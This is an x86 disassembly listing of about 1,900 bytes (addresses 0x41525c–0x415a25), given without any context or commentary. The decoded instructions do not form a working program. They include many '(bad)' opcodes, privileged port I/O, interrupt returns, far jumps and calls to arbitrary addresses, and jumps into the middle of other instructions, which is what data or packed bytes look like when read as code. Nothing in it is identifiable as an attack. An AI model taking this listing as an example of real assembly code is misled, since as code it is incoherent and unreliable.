  41525c:	sbb    dl,dl
  41525e:	jne    0x41527d
  415260:	fldcw  WORD PTR [edi+edi*2]
  415263:	test   al,0xc1
  415265:	or     BYTE PTR [edx+0x2d],0x78
  415269:	jo     0x415262
  41526b:	sahf   
  41526c:	shr    al,1
  41526e:	sbb    al,BYTE PTR [eax]
  415270:	not    BYTE PTR [eax+0x52]
  415273:	inc    BYTE PTR [esi+0x546c6f4e]
  415279:	fmul   st,st(1)
  41527b:	fst    DWORD PTR [eax+0x4ca64d7b]
  415281:	pop    ecx
  415282:	xchg   esp,eax
  415283:	cli    
  415284:	lds    esp,FWORD PTR [edi-0x78]
  415287:	popf   
  415288:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415289:	mov    bl,0xfc
  41528b:	xlat   BYTE PTR ds:[ebx]
  41528c:	repz xlat BYTE PTR ds:[ebx]
  41528e:	add    bh,BYTE PTR [ebx-0x57]
  415291:	cli    
  415292:	mov    al,0x5d
  415294:	mul    bl
  415296:	mov    esi,0x3df8a18a
  41529b:	cmp    esi,edi
  41529d:	sbb    ecx,DWORD PTR [ebx-0x21]
  4152a0:	dec    ebx
  4152a1:	iret   
  4152a2:	adc    BYTE PTR [esi-0x36],0x5d
  4152a6:	ror    BYTE PTR [edx+ebx*2-0x49f12232],1
  4152ad:	mov    dl,0x5d
  4152af:	rep outs dx,DWORD PTR es:[esi]
  4152b2:	and    eax,DWORD PTR [ecx+0xf]
  4152b5:	mov    cl,0xce
  4152b7:	test   bl,0x2
  4152ba:	(bad)  [ebp+0x8422519]
  4152c0:	call   0xff10:0x7aed9b97
  4152c7:	mov    edi,0xedee7d1
  4152cc:	js     0x415305
  4152ce:	pcmpeqb mm7,QWORD PTR [edi-0x70852297]
  4152d5:	ss sub al,0x3c
  4152d8:	mov    ecx,0x8b846ae7
  4152dd:	mov    eax,DWORD PTR [esi-0x43053cec]
  4152e3:	and    ebp,eax
  4152e5:	add    DWORD PTR [esi],edx
  4152e7:	pop    edi
  4152e8:	adc    bh,dh
  4152ea:	fs jg  0x41529b
  4152ed:	fiadd  WORD PTR [ebp-0x38]
  4152f0:	mov    al,0xc1
  4152f2:	xchg   ebx,eax
  4152f3:	ins    BYTE PTR es:[edi],dx
  4152f4:	mov    esp,0x5f797a9e
  4152f9:	out    dx,eax
  4152fa:	(bad)  
  4152fb:	mov    edi,0xea8a41c5
  415300:	stc    
  415301:	push   esp
  415302:	fimul  DWORD PTR [esi-0x6b]
  415305:	sub    al,0x48
  415307:	mov    ds:0x7af90ce8,al
  41530c:	push   ss
  41530d:	test   dl,dl
  41530f:	pop    edi
  415310:	popf   
  415311:	in     al,0xee
  415313:	test   eax,0x95afbd51
  415318:	add    al,0xd4
  41531a:	jne    0x4152a9
  41531c:	cmc    
  41531d:	jo     0x4152f0
  41531f:	cmp    BYTE PTR [ecx+ecx*4+0x44],dh
  415323:	sub    DWORD PTR [ebp-0x56],0xffffffef
  415327:	jp     0x415313
  415329:	stos   BYTE PTR es:[edi],al
  41532a:	or     al,0x10
  41532c:	inc    ebp
  41532d:	adc    BYTE PTR ds:0x7f4c4725,ch
  415333:	adc    dh,bl
  415335:	and    eax,0xc9ef51fa
  41533a:	mov    bh,0xc3
  41533c:	ficomp DWORD PTR [esi+0x3d334155]
  415342:	and    DWORD PTR [eax-0x6a],ebp
  415345:	add    al,BYTE PTR [eax]
  415347:	mov    BYTE PTR [ebx],bh
  415349:	or     BYTE PTR [ebp+0xb1d7938],0xda
  415350:	jmp    0x415304
  415352:	push   eax
  415353:	xchg   ebp,eax
  415354:	es and al,0x23
  415357:	mov    esp,0x1d0ab3f3
  41535c:	push   ebx
  41535d:	adc    esp,ebx
  41535f:	xchg   esp,eax
  415360:	mov    dl,BYTE PTR [ecx+0x4b]
  415363:	mov    DWORD PTR [esi+0x5e],edx
  415366:	dec    eax
  415367:	push   ebp
  415368:	out    0x2,eax
  41536a:	jnp    0x415399
  41536c:	sub    al,0xda
  41536e:	jmp    0x41538b
  415370:	pushf  
  415371:	test   eax,0xfd4d9e6c
  415376:	call   0x53f0:0x82aea8a4
  41537d:	cmp    al,0x4f
  41537f:	bound  ebx,QWORD PTR [ebx+0x63]
  415382:	xlat   BYTE PTR ds:[ebx]
  415383:	pop    eax
  415384:	mov    ds:0x4ecb0f99,al
  415389:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41538a:	shr    BYTE PTR [ebx-0x749951bf],cl
  415390:	push   es
  415391:	cwde   
  415392:	dec    esi
  415393:	push   ds
  415394:	loopne 0x415377
  415396:	outs   dx,DWORD PTR ds:[esi]
  415397:	ds mov al,bl
  41539a:	out    dx,eax
  41539b:	aaa    
  41539c:	push   es
  41539d:	push   es
  41539e:	xor    al,0x90
  4153a0:	int3   
  4153a1:	shl    BYTE PTR [ecx+eax*2-0x3d],0xf4
  4153a6:	sub    eax,0x56aeaed8
  4153ab:	sbb    eax,0x18e0135e
  4153b0:	xor    BYTE PTR [ebx],ah
  4153b2:	pop    eax
  4153b3:	pop    eax
  4153b4:	pusha  
  4153b5:	stc    
  4153b6:	or     al,0x42
  4153b8:	call   0xae6b000e
  4153bd:	and    eax,DWORD PTR [ebx]
  4153bf:	iret   
  4153c0:	test   DWORD PTR [ebp-0xebb6b7a],esi
  4153c6:	xor    DWORD PTR [ebx],edi
  4153c8:	push   ebp
  4153c9:	test   eax,0x635d0358
  4153ce:	popf   
  4153cf:	outs   dx,DWORD PTR ds:[esi]
  4153d0:	lahf   
  4153d1:	jo     0x415353
  4153d3:	push   0x7537a9ab
  4153d8:	xchg   BYTE PTR [edx-0x4c],dh
  4153db:	inc    esp
  4153dc:	mov    edi,DWORD PTR [edi]
  4153de:	imul   ebp,DWORD PTR [ecx-0x3c94b419],0xbc681a49
  4153e8:	ja     0x4153cf
  4153ea:	pusha  
  4153eb:	ins    BYTE PTR es:[edi],dx
  4153ec:	sub    DWORD PTR [eax],ecx
  4153ee:	add    edi,ebx
  4153f0:	dec    ebp
  4153f1:	lock rol edx,cl
  4153f4:	xor    eax,0x6b1ff2e0
  4153f9:	add    eax,0xe39dcb78
  4153fe:	jno    0x4153ba
  415400:	rcr    BYTE PTR [ebx],cl
  415402:	in     al,dx
  415403:	xchg   ebx,eax
  415404:	aam    0x93
  415406:	lds    ebp,FWORD PTR [eax-0x9]
  415409:	mov    cl,0xce
  41540b:	fsin   
  41540d:	push   edx
  41540e:	ror    BYTE PTR [esp+esi*2+0x21],1
  415412:	clc    
  415413:	jae    0x415481
  415415:	mov    ecx,0x4a626123
  41541a:	fld    DWORD PTR [edi-0x47]
  41541d:	aam    0x28
  41541f:	or     ebp,esi
  415421:	dec    ecx
  415422:	retf   0xf2fa
  415425:	jno    0x4154a5
  415427:	xchg   edx,eax
  415428:	sbb    ebx,ecx
  41542a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41542b:	jbe    0x415454
  41542d:	sub    cl,BYTE PTR ds:[edx+0x23]
  415431:	fst    st(5)
  415433:	dec    eax
  415434:	adc    ebx,DWORD PTR [edx+0x3d9bc124]
  41543a:	ins    DWORD PTR es:[edi],dx
  41543b:	pop    ebp
  41543c:	xchg   ebp,eax
  41543d:	pop    ss
  41543e:	mov    dl,0xbb
  415440:	and    cl,BYTE PTR [ebx+0x3b]
  415443:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415444:	fcmovne st,st(7)
  415446:	jmp    0x41545a
  415448:	mov    edi,eax
  41544a:	jb     0x415476
  41544c:	xor    ebp,DWORD PTR [esi+0x12]
  41544f:	mov    ch,0xfb
  415451:	mov    ecx,DWORD PTR [ebp-0x25]
  415454:	adc    BYTE PTR [ecx-0x27],bl
  415457:	repz loope 0x415472
  41545a:	push   ss
  41545b:	push   ebx
  41545c:	mov    ah,0xdf
  41545e:	jge    0x415443
  415460:	sti    
  415461:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415462:	ins    BYTE PTR es:[edi],dx
  415463:	sbb    eax,0xae9f1bc4
  415468:	inc    ebx
  415469:	(bad)
  41546c:	jp     0x415415
  41546e:	neg    al
  415470:	and    DWORD PTR [ebp+0x17d96672],0x7e2361ee
  41547a:	ret    0xcb09
  41547d:	push   0xffffffc6
  41547f:	aas    
  415480:	cmp    al,0x1d
  415482:	pushw  0x83b4
  415486:	aad    0x95
  415488:	xchg   esi,eax
  415489:	sub    DWORD PTR [ecx+edx*4+0x1ae86ff4],ebx
  415490:	(bad)  
  415491:	mov    dh,cl
  415493:	pusha  
  415494:	repnz fistp DWORD PTR [ebx+0x703a31a3]
  41549b:	jmp    0xd78:0x67560411
  4154a2:	(bad)  
  4154a3:	fmul   DWORD PTR [edi]
  4154a5:	or     al,0x32
  4154a7:	fxch   st(7)
  4154a9:	sub    eax,0xd609593b
  4154ae:	and    al,0x31
  4154b0:	inc    esi
  4154b1:	dec    edx
  4154b2:	daa    
  4154b3:	mov    eax,0xc42ceb86
  4154b8:	fcmovnbe st,st(1)
  4154ba:	test   bl,ch
  4154bc:	xor    eax,0x2d4a73cd
  4154c1:	inc    eax
  4154c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4154c3:	or     BYTE PTR [edi-0x5b],0x51
  4154c7:	test   eax,0xbccb7b3e
  4154cc:	jmp    DWORD PTR [esi-0x1d]
  4154cf:	mov    esp,esi
  4154d1:	sub    dh,BYTE PTR [edx+0xc]
  4154d4:	and    al,0xd8
  4154d6:	push   edx
  4154d7:	push   esp
  4154d8:	fcmove st,st(2)
  4154da:	jecxz  0x41552e
  4154dc:	xor    ecx,ebx
  4154de:	fsubr  QWORD PTR [ecx+0x30e2cd8]
  4154e4:	std    
  4154e5:	add    ecx,DWORD PTR [ebp-0x65]
  4154e8:	push   es
  4154e9:	ret    0xf154
  4154ec:	(bad)  
  4154ee:	cmp    BYTE PTR [edi],bl
  4154f0:	nop
  4154f1:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4154f3:	js     0x415491
  4154f5:	out    0x57,eax
  4154f7:	pop    ss
  4154f8:	imul   ebx,edx,0xffffffea
  4154fb:	pop    ecx
  4154fc:	or     edi,ecx
  4154fe:	in     al,0xab
  415500:	pop    eax
  415501:	sbb    BYTE PTR [edx+0x31f5ade],dl
  415507:	hlt    
  415508:	sub    BYTE PTR [edx+ebx*4-0x3e],bh
  41550c:	push   esp
  41550d:	pop    esi
  41550e:	fisttp DWORD PTR [ebp-0x36851c8]
  415514:	sbb    DWORD PTR [edx],ebp
  415516:	test   eax,0x4cbabb0b
  41551b:	xchg   edx,eax
  41551c:	bound  esi,QWORD PTR [edx]
  41551e:	daa    
  41551f:	out    0x1d,al
  415521:	scas   al,BYTE PTR es:[edi]
  415522:	xchg   ecx,eax
  415523:	retf   
  415524:	or     al,0x3b
  415526:	pop    esi
  415527:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415528:	sahf   
  415529:	in     eax,dx
  41552a:	pop    es
  41552b:	dec    eax
  41552c:	mov    esi,0x8780199d
  415531:	fdivr  DWORD PTR [esi]
  415533:	jo     0x415570
  415535:	in     al,dx
  415536:	and    ebx,DWORD PTR [edx-0x6dd4eb14]
  41553c:	xchg   DWORD PTR [eax+edx*4+0x79],esp
  415540:	push   ecx
  415541:	js     0x415584
  415543:	sub    al,0x3b
  415545:	mov    edx,0xc02cb378
  41554a:	xor    al,BYTE PTR [esi-0x56b4738b]
  415550:	enter  0xc280,0x75
  415554:	and    DWORD PTR [esi-0x48],0x768e7b60
  41555b:	xor    al,0xc6
  41555d:	bound  esp,QWORD PTR [ebx-0x3e]
  415560:	icebp  
  415561:	pushf  
  415562:	mov    bl,0x6e
  415564:	jne    0x415565
  415566:	imul   edx,edi,0xffffff9e
  415569:	mov    ?,WORD PTR [ebx-0x4e]
  41556c:	pusha  
  41556d:	dec    edx
  41556e:	pushf  
  41556f:	pop    eax
  415570:	rcr    BYTE PTR [ebx],cl
  415572:	jl     0x415535
  415574:	bound  esi,QWORD PTR [ebx+eax*4-0x46]
  415578:	pop    edi
  415579:	mov    ah,0x18
  41557b:	(bad)  
  41557d:	and    DWORD PTR [ebp+esi*1-0x45],esp
  415581:	push   edx
  415582:	mov    gs,WORD PTR [esi+0x4d50130a]
  415588:	loopne 0x4155f0
  41558a:	test   eax,0x884a1c5d
  41558f:	xchg   ebx,eax
  415590:	adc    dl,BYTE PTR [ebp-0x734e812]
  415596:	inc    ebp
  415597:	pop    esi
  415598:	mov    al,0xb
  41559a:	cli    
  41559b:	lea    edx,[eax-0x3f32f08e]
  4155a1:	bound  esi,QWORD PTR [edx-0x363ecc91]
  4155a7:	call   0x78821e32
  4155ac:	xchg   esi,eax
  4155ad:	xchg   ebp,eax
  4155ae:	add    al,0xf
  4155b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155b1:	xchg   ebp,eax
  4155b2:	cmp    ah,BYTE PTR [ebp+0x2a]
  4155b5:	or     DWORD PTR [ebp-0x8],eax
  4155b8:	jmp    0xceea766c
  4155bd:	or     ax,0x2f3f
  4155c1:	addr16 (bad) 
  4155c3:	int3   
  4155c4:	push   0xffffffb8
  4155c6:	mov    ds,WORD PTR ds:0x5efc1f4d
  4155cc:	clc    
  4155cd:	cmp    edi,DWORD PTR [esp+ebx*1+0x7c608512]
  4155d4:	pop    esp
  4155d5:	inc    esp
  4155d6:	jl     0x4155b6
  4155d8:	jecxz  0x4155f8
  4155da:	in     al,0x72
  4155dc:	cmp    eax,0xbc987554
  4155e1:	jmp    0x41557b
  4155e3:	sub    al,0x1f
  4155e5:	xchg   BYTE PTR [esi-0x6d],al
  4155e8:	inc    esi
  4155e9:	mov    BYTE PTR [ebp+0x7743078c],dh
  4155ef:	sar    BYTE PTR [ecx-0x2c],cl
  4155f2:	es es test al,0x21
  4155f6:	adc    BYTE PTR [ecx],bh
  4155f8:	jmp    0x5fcb:0xe3152796
  4155ff:	std    
  415600:	ror    DWORD PTR [eax],0x2d
  415603:	stos   DWORD PTR es:[edi],eax
  415604:	sbb    eax,0xb6b29074
  415609:	xchg   ebp,eax
  41560a:	dec    eax
  41560b:	sbb    al,0x73
  41560d:	lahf   
  41560e:	lock ret 0x8364
  415612:	inc    ecx
  415613:	pusha  
  415614:	jne    0x4155a6
  415616:	test   BYTE PTR [edx+0x18cd4e31],dl
  41561c:	(bad)  
  41561d:	or     BYTE PTR [edx],ah
  41561f:	icebp  
  415620:	rol    DWORD PTR [eax],cl
  415622:	test   eax,0x8b4f4aa5
  415627:	push   eax
  415628:	cmp    ecx,esi
  41562a:	cmp    dl,BYTE PTR [eax-0x1b61e4f8]
  415630:	add    DWORD PTR [eax+0x455bf870],ecx
  415636:	jb     0x415600
  415638:	mov    bh,0xf5
  41563a:	lea    ecx,[eax]
  41563c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41563d:	dec    esi
  41563e:	lock dec edi
  415640:	jne    0x4155ce
  415642:	pop    esp
  415643:	daa    
  415644:	or     edi,edx
  415646:	push   edx
  415647:	sub    BYTE PTR es:[edi+0x25ed5014],dl
  41564e:	inc    ebp
  41564f:	adc    ch,BYTE PTR ds:0x92743412
  415655:	out    0xe3,eax
  415657:	pop    eax
  415658:	icebp  
  415659:	sub    BYTE PTR [edx-0x314f4081],bl
  41565f:	cld    
  415660:	scas   eax,DWORD PTR es:[edi]
  415661:	xor    DWORD PTR [esi+0x1e],0xbb5da9b3
  415668:	dec    esp
  415669:	daa    
  41566a:	jmp    0x415626
  41566c:	or     eax,0x6f0ad167
  415671:	cmp    eax,0xf53dcabd
  415676:	loop   0x4156ef
  415678:	in     eax,dx
  415679:	int3   
  41567a:	dec    eax
  41567b:	dec    esi
  41567c:	rcr    DWORD PTR [edi+0x4b6f43ce],0xf9
  415683:	pop    ss
  415684:	lock inc di
  415687:	mov    ecx,0x76e00f4d
  41568c:	mov    ah,0xef
  41568e:	mov    esp,0xfc8c21e2
  415693:	sbb    ebx,DWORD PTR [edi-0x4500f596]
  415699:	lods   al,BYTE PTR ds:[esi]
  41569a:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41569c:	inc    edx
  41569d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41569e:	mov    al,ds:0x91a1e971
  4156a3:	retf   0x4d8a
  4156a6:	nop
  4156a7:	jge    0x415696
  4156a9:	push   ecx
  4156aa:	inc    edi
  4156ab:	cmp    BYTE PTR [edx+esi*2-0x7a97566c],ah
  4156b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156b3:	pop    ecx
  4156b4:	cmp    DWORD PTR [ebp-0x3b],esp
  4156b7:	xchg   ebp,eax
  4156b8:	mov    ds:0x80b9635c,eax
  4156bd:	mov    ecx,0x566f87f3
  4156c2:	aam    0x3f
  4156c4:	bound  ebp,QWORD PTR [ecx]
  4156c6:	sti    
  4156c7:	aad    0xb4
  4156c9:	fdivr  QWORD PTR [edi+ecx*1+0x4d]
  4156cd:	mov    ds:0xf0403745,eax
  4156d2:	(bad)  
  4156d3:	rol    BYTE PTR [eax],0x95
  4156d6:	iret   
  4156d7:	daa    
  4156d8:	mov    DWORD PTR [edi+0x49c3e0cb],esp
  4156de:	jl     0x41575f
  4156e0:	fcomp  QWORD PTR [edi]
  4156e2:	lock jae 0x415724
  4156e5:	inc    ecx
  4156e6:	mov    edx,0xc542393a
  4156eb:	into   
  4156ec:	(bad)  
  4156ed:	in     al,dx
  4156ee:	jae    0x415728
  4156f0:	push   ecx
  4156f1:	sub    bh,BYTE PTR [eax+0x34]
  4156f4:	xor    DWORD PTR [eax],0x12
  4156f7:	stos   DWORD PTR es:[edi],eax
  4156f8:	xor    eax,0xce47d857
  4156fd:	pop    esp
  4156fe:	add    cl,BYTE PTR [esi-0x42]
  415701:	popa   
  415702:	jp     0x415734
  415704:	mov    dl,0x4d
  415706:	aad    0x98
  415708:	adc    eax,0x35e47965
  41570d:	cmp    dh,bh
  41570f:	fidiv  DWORD PTR [esi+0x6a]
  415712:	jns    0x4156e7
  415714:	popa   
  415715:	test   al,0xee
  415717:	lods   al,BYTE PTR gs:[esi]
  415719:	and    al,0x8b
  41571b:	cmp    DWORD PTR [ecx-0x34],edx
  41571e:	aad    0x9d
  415720:	or     eax,0x28bb2300
  415725:	or     esi,0x68
  415728:	loopne 0x4156ce
  41572a:	scas   eax,DWORD PTR es:[edi]
  41572b:	dec    esp
  41572c:	out    dx,eax
  41572d:	dec    esp
  41572e:	mov    edx,DWORD PTR [ecx+0x78]
  415731:	push   es
  415732:	fstp   DWORD PTR [ebp+0x1f5a5270]
  415738:	test   BYTE PTR [edx],bh
  41573a:	jge    0x4157ab
  41573c:	or     edi,eax
  41573e:	sbb    esi,DWORD PTR [ebx]
  415740:	inc    esp
  415741:	addr16 cwde 
  415743:	test   DWORD PTR [ebx-0x78],esp
  415746:	inc    edx
  415747:	jmp    0xc761da06
  41574c:	cdq    
  41574d:	loopne 0x4157a9
  41574f:	push   ds
  415750:	pop    edx
  415751:	stos   BYTE PTR es:[edi],al
  415752:	and    eax,0xfc277cf1
  415757:	iret   
  415758:	pusha  
  415759:	dec    eax
  41575a:	push   0x867d4592
  41575f:	xchg   ebx,eax
  415760:	sbb    ecx,ebp
  415762:	mov    ecx,0xeea5900f
  415767:	cmp    al,0xba
  415769:	cwde   
  41576a:	out    dx,al
  41576b:	mov    al,ds:0xb2a92feb
  415770:	sbb    eax,0xf3673b73
  415775:	push   esp
  415776:	mov    bx,0x2757
  41577a:	pop    edi
  41577b:	ficomp WORD PTR [eax-0x11b44aa5]
  415781:	imul   esi,esi,0xe808d216
  415787:	mov    esi,edx
  415789:	dec    ebx
  41578a:	fcomp  DWORD PTR [eax-0x77a3ba83]
  415790:	sbb    DWORD PTR [edx-0x78],ebx
  415793:	(bad)  
  415794:	adc    dl,al
  415796:	in     eax,0xcb
  415798:	jmp    0xdcc78fd4
  41579d:	in     eax,0xa6
  41579f:	pusha  
  4157a0:	or     ebp,DWORD PTR [ecx+0x23c3803a]
  4157a6:	dec    ecx
  4157a7:	add    BYTE PTR ss:[esi+0x53],dh
  4157ab:	out    dx,al
  4157ac:	lods   eax,DWORD PTR ds:[esi]
  4157ad:	aaa    
  4157ae:	gs into 
  4157b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157b1:	jb     0x415736
  4157b3:	test   DWORD PTR ds:0xadd07847,0xc8883e7b
  4157bd:	sbb    eax,0xf18d20ed
  4157c2:	mov    ch,ch
  4157c4:	repz jp 0x415781
  4157c7:	sub    al,0x4d
  4157c9:	ja     0x415792
  4157cb:	cmp    al,0x2f
  4157cd:	inc    edi
  4157ce:	inc    ebp
  4157cf:	mov    eax,ds:0x9d444f66
  4157d4:	lds    edi,FWORD PTR [ebp+0x74431f5c]
  4157da:	loopne 0x415807
  4157dc:	bound  esi,QWORD PTR [esp+esi*2+0x2c]
  4157e0:	call   0x4d7b:0xb4054a2
  4157e7:	ret    0xcd
  4157ea:	loope  0x41580e
  4157ec:	(bad)  
  4157ed:	cmp    edx,DWORD PTR [eax-0x70beb75e]
  4157f3:	inc    edi
  4157f4:	std    
  4157f5:	les    ebx,FWORD PTR ds:0x3e84173
  4157fb:	stos   BYTE PTR es:[edi],al
  4157fc:	add    dl,bh
  4157fe:	ss es fstp QWORD PTR ss:[edi-0x37fd8f35]
  415807:	mov    WORD PTR [ebp+ebp*8-0x77],?
  41580b:	bound  ebx,QWORD PTR [eax-0x63e70615]
  415811:	(bad)  
  415813:	mov    ch,0x85
  415815:	and    al,0xe9
  415817:	push   eax
  415818:	leave  
  415819:	jnp    0x415830
  41581b:	dec    edi
  41581c:	scas   eax,DWORD PTR es:[edi]
  41581d:	icebp  
  41581e:	cld    
  41581f:	xchg   edx,eax
  415820:	into   
  415821:	xor    DWORD PTR [ebx-0x42],esp
  415824:	je     0x4157a9
  415826:	pop    es
  415827:	jno    0x41585a
  415829:	mov    edx,0xc462b538
  41582e:	push   esp
  41582f:	aas    
  415830:	inc    eax
  415831:	retf   0x14c4
  415834:	mov    edi,0xee53c185
  415839:	sbb    DWORD PTR [edi+0x7eb99a59],ebx
  41583f:	jbe    0x4157f9
  415841:	ss add al,0x82
  415845:	inc    edi
  415846:	mov    ah,0x9e
  415848:	hlt    
  415849:	mov    cl,0x97
  41584b:	int3   
  41584c:	mov    esi,0x672be37e
  415851:	in     al,dx
  415852:	fsub   st(4),st
  415854:	push   0xc43b3cfc
  415859:	popa   
  41585a:	hlt    
  41585b:	jge    0x41583e
  41585d:	pop    es
  41585e:	lar    edi,WORD PTR [edi]
  415861:	pop    ecx
  415862:	es iret 
  415864:	in     eax,dx
  415865:	repz xor dl,BYTE PTR [ebp+0x2645cf1a]
  41586c:	arpl   WORD PTR [ebp+ebp*8+0x6f],cx
  415870:	xchg   edx,eax
  415871:	iret   
  415872:	mov    dh,0xed
  415874:	inc    ebp
  415876:	(bad)  
  415877:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415878:	mov    dl,0xea
  41587a:	adc    DWORD PTR [edx+ecx*4+0x57b1e96d],edx
  415881:	push   ecx
  415882:	push   eax
  415883:	add    dh,BYTE PTR [ecx]
  415885:	inc    ebp
  415886:	fcom   QWORD PTR [eax+0x2a]
  415889:	(bad)  
  41588b:	outs   dx,DWORD PTR ds:[esi]
  41588c:	xor    DWORD PTR [edx-0x2d],edx
  41588f:	push   esi
  415890:	ror    dh,cl
  415892:	cld    
  415893:	sub    cl,BYTE PTR [ebp+0x76]
  415896:	and    edi,ebp
  415898:	leave  
  415899:	aam    0xc7
  41589b:	sbb    eax,0x1635df8a
  4158a0:	leave  
  4158a1:	daa    
  4158a2:	mov    cl,BYTE PTR [ebx+0x6ecbe79c]
  4158a8:	daa    
  4158a9:	xchg   ebp,eax
  4158aa:	inc    edx
  4158ab:	mov    al,0xd2
  4158ad:	cwde   
  4158ae:	xor    DWORD PTR [ebp-0xe5d8f70],eax
  4158b4:	mov    bh,0x89
  4158b6:	push   ss
  4158b7:	shr    BYTE PTR [edx-0x65],1
  4158ba:	mov    ebx,0x2fe2a694
  4158bf:	mov    al,ds:0x5718bb72
  4158c4:	int3   
  4158c5:	pop    ebp
  4158c6:	mov    al,0xa3
  4158c8:	nop
  4158c9:	sub    DWORD PTR [ebp+0x62],eax
  4158cc:	cmp    edi,edx
  4158ce:	mov    edi,0x2928ece
  4158d3:	imul   esp,DWORD PTR [edi-0x62],0x29610603
  4158da:	and    bh,0x2e
  4158dd:	sahf   
  4158de:	jno    0x4158c5
  4158e0:	xchg   ebp,edx
  4158e2:	mov    ah,0x9c
  4158e4:	mov    ebx,0xb9a68740
  4158e9:	pop    ebp
  4158ea:	scas   al,BYTE PTR es:[edi]
  4158eb:	mov    ch,0xb5
  4158ed:	xchg   DWORD PTR [edi],esi
  4158ef:	mov    edx,0xd29b21a8
  4158f4:	push   ecx
  4158f5:	jecxz  0x415909
  4158f7:	jae    0x41594c
  4158f9:	pop    ecx
  4158fa:	icebp  
  4158fb:	push   ebp
  4158fc:	iret   
  4158fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158fe:	ret    
  4158ff:	add    esp,DWORD PTR [ebp-0x65afc6f4]
  415905:	pop    ecx
  415906:	mov    cl,BYTE PTR ds:0xfd7af654
  41590c:	shl    DWORD PTR [ecx-0x25cd3851],0x4b
  415913:	add    al,0x52
  415915:	inc    ebp
  415916:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415917:	mov    BYTE PTR [eax+0x9198b47],cl
  41591d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41591e:	add    al,dh
  415920:	retf   0x4bd2
  415923:	mov    edx,0xd6043f67
  415928:	or     DWORD PTR [eax],ebx
  41592a:	std    
  41592b:	and    BYTE PTR [eax+0x766c49ed],al
  415931:	sbb    DWORD PTR [edx],edi
  415933:	pop    ecx
  415934:	xchg   ebp,eax
  415935:	and    al,0x41
  415937:	push   edx
  415938:	sbb    al,0x68
  41593a:	aad    0x5b
  41593c:	pop    ss
  41593d:	rcl    BYTE PTR es:[edi-0x53],cl
  415941:	adc    ch,BYTE PTR [edi-0x497079a9]
  415947:	inc    ecx
  415948:	popa   
  415949:	add    BYTE PTR [esi+0x3400a7d7],bh
  41594f:	adc    ah,dl
  415951:	mov    ds:0x65f2685,eax
  415956:	jbe    0x415943
  415958:	gs lahf 
  41595a:	mov    al,0x8a
  41595c:	scas   al,BYTE PTR es:[edi]
  41595d:	push   ebx
  41595e:	xchg   BYTE PTR [ecx],ah
  415960:	pop    es
  415961:	mov    al,BYTE PTR [eax-0x5a51fe71]
  415967:	xchg   ebx,eax
  415968:	sub    BYTE PTR [eax],0x94
  41596b:	outs   dx,BYTE PTR ds:[esi]
  41596c:	pop    edx
  41596d:	jmp    0x415904
  41596f:	das    
  415970:	stos   BYTE PTR es:[edi],al
  415971:	mov    ds:0xa4503161,al
  415976:	sti    
  415977:	fisubr WORD PTR [edi-0x14]
  41597a:	push   0x60
  41597c:	mov    dl,0xfd
  41597e:	xchg   edi,eax
  41597f:	out    dx,eax
  415980:	pop    ds
  415981:	fisubr DWORD PTR [edi-0x7a]
  415984:	fld    TBYTE PTR [edx+edx*2]
  415987:	popf   
  415988:	jne    0x415979
  41598a:	je     0x415998
  41598c:	(bad)  
  41598d:	mov    dl,0xf9
  41598f:	push   edx
  415990:	and    edi,DWORD PTR [ebx-0x5c1c6929]
  415996:	arpl   WORD PTR cs:[edi],cx
  415999:	mov    WORD PTR [edx+0x3],?
  41599c:	pop    esp
  41599d:	loope  0x4159b3
  41599f:	js     0x415a02
  4159a1:	leave  
  4159a2:	ins    DWORD PTR es:[edi],dx
  4159a3:	dec    edi
  4159a4:	iret   
  4159a5:	iret   
  4159a6:	fmul   QWORD PTR [ecx+0x726f5519]
  4159ac:	sbb    eax,edi
  4159ae:	mov    eax,ds:0xa4272da3
  4159b3:	(bad)  
  4159b5:	clc    
  4159b6:	xor    eax,0x50452bd3
  4159bb:	jo     0x415952
  4159bd:	push   ds
  4159be:	inc    eax
  4159bf:	mov    gs,esp
  4159c1:	stos   BYTE PTR es:[edi],al
  4159c2:	cmp    ebp,DWORD PTR [ebx-0x71a085eb]
  4159c8:	loop   0x415a3a
  4159ca:	nop
  4159cb:	mov    ecx,0xd321b634
  4159d0:	mov    WORD PTR [eax+0x689398f0],ds
  4159d6:	pop    ecx
  4159d7:	pop    es
  4159d8:	lods   al,BYTE PTR ds:[esi]
  4159d9:	adc    DWORD PTR [ecx-0x677559a6],0x24e7ddc6
  4159e3:	xchg   BYTE PTR [edx],bh
  4159e5:	xchg   ecx,eax
  4159e6:	aas    
  4159e7:	in     al,dx
  4159e8:	stc    
  4159e9:	add    edi,DWORD PTR [ebp-0x6d]
  4159ec:	xchg   BYTE PTR [ebx+0x1e],dl
  4159ef:	mov    BYTE PTR [edi+ebp*1],al
  4159f2:	dec    ebx
  4159f3:	mov    ebp,0x6d554fdf
  4159f8:	sbb    eax,0x54279588
  4159fd:	es jo  0x4159ff
  415a00:	and    al,0xcb
  415a02:	mov    ebp,DWORD PTR [eax+0x75]
  415a05:	and    DWORD PTR [eax],ecx
  415a07:	in     al,dx
  415a08:	xchg   BYTE PTR [esi-0x6bcc6f03],dl
  415a0e:	add    ch,BYTE PTR [edi-0x28cffe53]
  415a14:	xchg   edi,eax
  415a15:	(bad)  
  415a16:	fidiv  WORD PTR [edi-0x70]
  415a19:	(bad)  
  415a1b:	or     BYTE PTR [edx],ch
  415a1d:	push   0x71
  415a1f:	or     al,0x70
  415a21:	outs   dx,BYTE PTR ds:[esi]
  415a22:	xchg   DWORD PTR [edi-0xd],esi
  415a25:	arpl   WORD PTR [esi],sp
